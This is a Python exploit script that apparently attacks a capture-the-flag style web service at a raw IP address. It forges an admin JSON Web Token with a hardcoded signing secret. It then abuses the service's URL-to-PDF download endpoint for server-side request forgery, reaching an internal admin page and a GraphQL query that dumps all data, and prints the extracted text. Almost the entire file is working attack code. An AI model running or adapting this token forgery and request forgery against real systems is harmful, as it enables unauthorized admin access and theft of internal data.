import base64, hashlib, hmac, io, json, re, urllib.parse, urllib.request, urllib.error
from pypdf import PdfReader

base = "http://154.57.164.68:31206"
SECRET = "Str0ng_K3y_N0_l3ak_pl3ase?"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_role(role: str) -> str:
    h = b64url(b'{"alg":"HS256","typ":"JWT"}')
    p = b64url(json.dumps({"role": role}, separators=(",", ":")).encode())
    s = hmac.new(SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(s)}"


def http(url, data=None, timeout=80):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def pdf_text(blob):
    if not blob.startswith(b"%PDF"):
        return blob.decode("utf-8", "replace")[:500]
    r = PdfReader(io.BytesIO(blob))
    return "\n".join((p.extract_text() or "") for p in r.pages)[:600]


_, tok = http(base + "/getToken")
user = tok.decode().strip()
admin = jwt_role("admin")

# verify token from outside
st, b = http(f"{base}/admin?token={urllib.parse.quote(admin)}")
print(f"Q: external /admin? |+ {st} {b[:80]!r} | -")

# SSRF main-document GET /admin
inner = f"http://127.0.0.1:1337/admin?token={admin}"
st, blob = http(
    f"{base}/download?token={urllib.parse.quote(user)}",
    urllib.parse.urlencode({"url": inner}).encode(),
)
print(f"Q: SSRF /admin localhost? |+ {st} {pdf_text(blob)[:200]!r} | -")

# SSRF graphql getAllData
gql = "{getAllData{name}}"
inner = f"http://127.0.0.1:1337/graphql?token={admin}&query={urllib.parse.quote(gql, safe='')}"
st, blob = http(
    f"{base}/download?token={urllib.parse.quote(user)}",
    urllib.parse.urlencode({"url": inner}).encode(),
)
print(f"Q: SSRF graphql getAllData? |+ {st} {pdf_text(blob)[:250]!r} | -")
